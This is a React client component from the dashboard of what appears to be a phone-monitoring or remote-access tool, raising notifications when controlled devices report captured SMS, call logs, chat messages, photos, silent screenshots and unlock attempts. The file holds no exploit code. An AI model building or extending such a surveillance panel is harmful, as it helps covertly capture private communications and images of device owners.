'use client';

import { useEffect, useMemo } from 'react';
import { usePathname, useSearchParams } from 'next/navigation';
import { connectSocket } from '@/lib/socket';
import { useNotificationsStore } from '@/lib/notificationsStore';
import { useDevicesStore } from '@/lib/store';

export default function NotificationListener() {
    const { addNotification } = useNotificationsStore();
    const { devices } = useDevicesStore();
    const pathname = usePathname();
    const searchParams = useSearchParams();

    // Determine current context
    const currentViewDeviceId = useMemo(() => {
        if (pathname?.startsWith('/devices/view')) {
            return searchParams.get('id');
        }
        return null;
    }, [pathname, searchParams]);

    const isDashboard = pathname === '/';

    useEffect(() => {
        const socket = connectSocket();

        // Helper to check if we should notify for this device/type
        const shouldNotify = (deviceId: string, type: 'status' | 'data') => {
            // Priority 1: If on dashboard, show everything
            if (isDashboard) return true;

            // Priority 2: Status alerts (online/offline) are ONLY for dashboard
            if (type === 'status') return false;

            // Priority 3: If on a specific device page, only show data for THAT device
            if (currentViewDeviceId) {
                return deviceId === currentViewDeviceId;
            }

            // Default: allow data notifications for any device if not in a suppressed state
            return true;
        };

        // 1. Device Online/Offline
        const handleOnline = (data: { deviceId: string; model?: string }) => {
            if (!shouldNotify(data.deviceId, 'status')) return;

            const device = devices.find(d => d.deviceId === data.deviceId);
            const name = data.model || device?.model || device?.manufacturer || 'Unknown Device';

            addNotification({
                type: 'online',
                title: 'Device Online',
                message: `${name} is now connected.`,
                deviceId: data.deviceId,
                deviceName: name,
                link: `/devices/view/?id=${data.deviceId}`
            });
        };

        const handleOffline = (data: { deviceId: string }) => {
            if (!shouldNotify(data.deviceId, 'status')) return;

            const device = devices.find(d => d.deviceId === data.deviceId);
            const name = device?.model || device?.manufacturer || 'Unknown Device';

            addNotification({
                type: 'offline',
                title: 'Device Offline',
                message: `${name} has disconnected.`,
                deviceId: data.deviceId,
                deviceName: name,
                link: `/devices/view/?id=${data.deviceId}`
            });
        };

        // 2. Data Updates
        const handleSmsUpdate = (data: { deviceId: string; count: number }) => {
            if (!shouldNotify(data.deviceId, 'data')) return;

            const device = devices.find(d => d.deviceId === data.deviceId);
            const name = device?.model || device?.manufacturer || 'Device';

            addNotification({
                type: 'sms',
                title: 'New SMS Captured',
                message: `${data.count || 1} new message(s) fetched from ${name}.`,
                deviceId: data.deviceId,
                deviceName: name,
                link: `/devices/view/sms/?id=${data.deviceId}`
            });
        };

        const handleCallsUpdate = (data: { deviceId: string; count: number }) => {
            if (!shouldNotify(data.deviceId, 'data')) return;

            const device = devices.find(d => d.deviceId === data.deviceId);
            const name = device?.model || device?.manufacturer || 'Device';

            addNotification({
                type: 'call',
                title: 'Call Logs Updated',
                message: `${data.count || 1} new call record(s) from ${name}.`,
                deviceId: data.deviceId,
                deviceName: name,
                link: `/devices/view/calls/?id=${data.deviceId}`
            });
        };

        const handleChatNew = (data: { deviceId: string; app?: string; contactName?: string }) => {
            if (!shouldNotify(data.deviceId, 'data')) return;

            const device = devices.find(d => d.deviceId === data.deviceId);
            const name = device?.model || device?.manufacturer || 'Device';
            const appName = (data.app && data.app !== 'undefined') ? data.app : 'Social Media';

            // Generate link to specific chat if possible
            const chatLink = data.contactName
                ? `/messages?deviceId=${data.deviceId}&app=${appName.toLowerCase()}&contactName=${encodeURIComponent(data.contactName)}`
                : `/messages?deviceId=${data.deviceId}&app=${appName.toLowerCase()}`;

            addNotification({
                type: 'sms',
                title: `${appName} Alert`,
                message: data.contactName
                    ? `New message from ${data.contactName} on ${name}.`
                    : `New activity detected in ${appName} on ${name}.`,
                deviceId: data.deviceId,
                deviceName: name,
                link: chatLink
            });
        };

        const handlePhotosUpdate = (data: { deviceId: string; count: number }) => {
            if (!shouldNotify(data.deviceId, 'data')) return;

            const device = devices.find(d => d.deviceId === data.deviceId);
            const name = device?.model || device?.manufacturer || 'Device';

            addNotification({
                type: 'photo',
                title: 'New Photos',
                message: `${data.count || 1} new gallery items available from ${name}.`,
                deviceId: data.deviceId,
                deviceName: name,
                link: `/devices/view/gallery/?id=${data.deviceId}&tab=photos`
            });
        };

        const handleScreenshotCaptured = (data: { deviceId: string }) => {
            if (!shouldNotify(data.deviceId, 'data')) return;

            const device = devices.find(d => d.deviceId === data.deviceId);
            const name = device?.model || device?.manufacturer || 'Device';

            addNotification({
                type: 'screenshot',
                title: 'Screenshot Captured',
                message: `A new screen record was saved from ${name}.`,
                deviceId: data.deviceId,
                deviceName: name,
                link: `/devices/view/gallery/?id=${data.deviceId}&tab=screenshots`
            });
        };

        const handleUnlockAttempt = (data: { deviceId: string; success: boolean }) => {
            if (!shouldNotify(data.deviceId, 'data')) return;

            const device = devices.find(d => d.deviceId === data.deviceId);
            const name = device?.model || device?.manufacturer || 'Device';

            addNotification({
                type: 'security',
                title: 'Device Unlock Attempt',
                message: `${data.success ? 'Successful' : 'Failed'} unlock attempt on ${name}.`,
                deviceId: data.deviceId,
                deviceName: name,
                link: `/devices/view/phone-lock/?id=${data.deviceId}`
            });
        };

        // Attach listeners
        socket.on('device:online', handleOnline);
        socket.on('device:offline', handleOffline);
        socket.on('sms:update', handleSmsUpdate);
        socket.on('calls:update', handleCallsUpdate);
        socket.on('chat:new', handleChatNew);
        socket.on('photos:update', handlePhotosUpdate);
        socket.on('silent-screen:screenshot', handleScreenshotCaptured);
        socket.on('unlock:attempt', handleUnlockAttempt);

        return () => {
            socket.off('device:online', handleOnline);
            socket.off('device:offline', handleOffline);
            socket.off('sms:update', handleSmsUpdate);
            socket.off('calls:update', handleCallsUpdate);
            socket.off('chat:new', handleChatNew);
            socket.off('photos:update', handlePhotosUpdate);
            socket.off('silent-screen:screenshot', handleScreenshotCaptured);
            socket.off('unlock:attempt', handleUnlockAttempt);
        };
    }, [devices, addNotification]);

    return null; // This is a logic-only component
}
